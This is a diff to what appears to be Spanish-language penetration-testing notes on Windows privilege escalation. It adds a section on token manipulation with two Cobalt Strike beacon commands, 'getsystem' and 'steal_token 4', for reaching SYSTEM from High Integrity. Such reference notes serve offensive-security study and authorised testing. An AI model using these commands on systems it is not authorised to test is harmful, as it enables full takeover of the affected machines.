@@ -19,3 +19,12 @@ Privilegios con impacto total en el sistema:
 | SeBackUpPriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/sebackuppriv\|SeBackUpPriv]] |
 | SeRestorePriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/serestorepriv\|SeRestorePriv]] |
 | SeManageVolumePriv | [[03-post-explotacion/privilege-escalation/windows/privilegios/semanagevolumepriv\|SeManageVolumePriv]] |
+
+## Token Manipulation (ya en High Integrity)
+
+Con High Integrity, el siguiente paso es llegar a SYSTEM robando o duplicando un token.
+
+```
+beacon> getsystem          # Intenta varios métodos automáticamente
+beacon> steal_token 4      # Robar token del proceso SYSTEM (PID 4 = System)
+```
